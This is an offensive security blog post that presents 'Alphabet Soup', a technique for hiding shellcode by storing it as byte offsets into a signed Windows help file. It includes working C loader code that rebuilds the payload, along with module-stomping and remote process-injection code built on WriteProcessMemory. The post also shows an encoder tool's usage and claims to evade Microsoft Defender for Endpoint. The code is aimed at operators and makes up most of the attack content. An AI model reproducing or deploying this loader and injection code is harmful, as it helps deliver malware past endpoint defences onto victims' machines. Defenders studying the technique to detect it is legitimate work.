# :skull: Alphabet Soup: LOTL Shellcode Obfuscation

---


![Shellcode obfuscation operates on the raw bytes](diagrams/shellcode-structure.png)

*Shellcode obfuscation operates on the raw bytes.*


# Alphabet Soup: LOTL Shellcode Obfuscation

## A Living Off The Land Recipe for Shellcode Obfuscation

## Background

### Context

Traditional process injection and shellcode obfuscation techniques often run into challenges when facing modern signature-based detection and behavioral analysis. Most loaders carry a static, encrypted blob and utilize common patterns to decode the data. The sudden appearance of high-entropy data, combined with recognizable shellcode or suspicious routines, is exactly what EDR platforms and threat hunters look for.

Alphabet Soup is a payload obfuscation technique that leverages Living off the Land (LOTL) principles to evade modern detection engines. The bytes we need are already on the target system; they’re just in the wrong order. All we need to do is retrieve them and rearrange them.

## Project Code

### AlphabetSoup Github Repo

The complete code referenced in this post is available in the AlphabetSoup repository on GitHub, including the example PoC code and the helper script.

## Concept

### Look Up Table (LUT)

By treating existing, signed system files as a dictionary, we can construct a payload without including the actual shellcode bytes in our binary. This LUT approach relies on two primary components:

- The Dictionary File: A legitimate, static system file (e.g., a `.chm` help file or a signed `.dll`) that contains the necessary byte distribution to satisfy the shellcode requirements.

- The Index Array: A list of offsets that point to specific byte values within the dictionary file.

To encode the payload, the *helper *reads hex shellcode bytes and scans the provided dictionary file to locate the corresponding byte values, recording the index for each. The result is an integer array of indices that represent the shellcode bytes.

To decode the payload, the *loader* simply maps the dictionary file to memory and performs a series of lookups.

The binary itself contains no suspicious byte sequences; it is only a list of integers. The decode function opens a handle to a trusted resource, which is used as the dictionary.

This process can be further obfuscated in any number of ways, depending on creativity and the desired level of complexity. For clarity, the decoding process will remain a simple mapping exercise in these examples.

## Get Tom O'Neill’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

As a bonus, since the dictionary must be present and must match the file the payload was encoded against, the dictionary file acts as a guardrail and anti-analysis tool.

## Implementation

### Encoder Helper

Written in Python, this piece was generated entirely by AI using a couple of prompts to guide things. The purpose of the encoder helper is to map shellcode bytes to indices in the designated dictionary file and output the results in a format suitable for deployment to a loader.

```
PS C:\dev\AlphabetSoup> python encoder.py -h
usage: encoder.py [-h] [-i INPUT] [-t TEXT] -s SOURCE [-k KEY] [--xor]

options:
-h, --help show this help message and exit
-i, --input INPUT File with \x00 style shellcode
-t, --text TEXT Plain text string
-s, --source SOURCE
-k, --key KEY
--xor
PS C:\dev\AlphabetSoup>
```

### Payload Reconstruction

The payload reconstruction process is a standard Lookup Table (LUT) substitution. This can be done in any number of ways, but the delivery mechanism must:

- Open and map the dictionary file to memory.

```
// Map the dictionary file (the source)
HANDLE hFile = CreateFileA("C:\\Windows\\Help\\mui\\0409\\cliconf.chm", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)
```

- Parse the first index of the payload to check for an XOR key.

```
// Extract the key from the first element
DWORD activeKey = (DWORD)alphabetSoup[0];
size_t payloadSize = soupSize - 1; // Real shellcode size is total minus the key
```

- Iterate through the array and decode each offset.

- Lookup the byte value in the dictionary using the decoded offset.

```
// Decode indices and write directly into the target DLL memory space
printf("[*] Harvesting using Key: 0x%X\n", activeKey);
for (size_t i = 1; i < soupSize; i++) {
// Decode the offset
unsigned long long realOffset = alphabetSoup[i];
if (activeKey != 0) { realOffset ^= activeKey; }
*((BYTE*)pStompTarget + (i - 1)) = *((BYTE*)pChmBase + (DWORD)realOffset);
}
printf("[+] Target memory stomped.\n");
```

### Process Injection

A process injection method should be integrated with the reconstruction logic. The exact method is up to the operator and should be tailored to the situation and operational objectives.

For the examples, a couple of methods are used to ‘drip load’ the bytes into the target buffer:

- The local injection example local-injection.cpp performs module stomping.

```
// Locate target function for stomping
HMODULE hBowlDll = LoadLibraryA("wininet.dll");
LPVOID pStompTarget = (LPVOID)GetProcAddress(hBowlDll, "CommitUrlCacheEntryW");
printf("[+] Target wininet.dll!CommitUrlCacheEntryW loaded at: : 0x%016llx\n", pStompTarget)
...
// Decode indices and write directly into the target DLL memory space
printf("[*] Harvesting using Key: 0x%X\n", activeKey);
for (size_t i = 1; i < soupSize; i++) {
// Decode the offset
unsigned long long realOffset = alphabetSoup[i];
if (activeKey != 0) { realOffset ^= activeKey; }
*((BYTE*)pStompTarget + (i - 1)) = *((BYTE*)pChmBase + (DWORD)realOffset);
}
printf("[+] Target memory stomped.\n");
```

- The remote injection remote-injection.cpp example writes the decoded shellcode to the PID specified by the first command-line argument and creates a new thread to execute it.

```
// Open Process and Allocate
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
if (!hProcess) {
printf("[!] Failed to open process: %d\n", GetLastError());
return 1;
}
...
// Decode and drip into the remote process
printf("[*] Decoding indices and writing directly to remote process...\n");
for (size_t i = 1; i < soupSize; i++) {
// Decode the offset
unsigned long long realOffset = alphabetSoup[i];
if (activeKey != 0) { realOffset ^= activeKey; }

// TODO: Is this offset within our mapped source?
// Calculate sourceFileSize earlier)
// if (realOffset >= sourceFileSize) { break; }

// Read exactly one byte from our local mapped file
BYTE targetByte = *((BYTE*)pChmBase + (DWORD)realOffset);

// Calculate the specific remote address for the current byte
LPVOID remoteAddressForByte = (LPVOID)((ULONG_PTR)pRemoteBowl + (i - 1));

// Drip the byte into the remote process
if (!WriteProcessMemory(hProcess, remoteAddressForByte, &targetByte, 1, NULL)) {
printf("[!] Drip failed at index %zu. Error: %d\n", i, GetLastError());
break;
}

// Add a delay to make the "drip" even slower/stealthier? Sleep might not be stealthy
// Sleep(1);
}
```

## Proof-of-Concept

### MDE Evasion

PoC of static and dynamic evasion of Microsoft Defender for Endpoint (MDE) with the local injection example using module stomping to stage and execute the shellcode.

*The obligatory calc.exe screenshot with MDE active.*

The shellcode used in the examples is a ‘known bad’ sample, and without shellcode obfuscation, the same binary cannot be dropped to disk or executed without Defender blocking it. A simple static analysis would quickly and easily identify the malicious pattern.

---
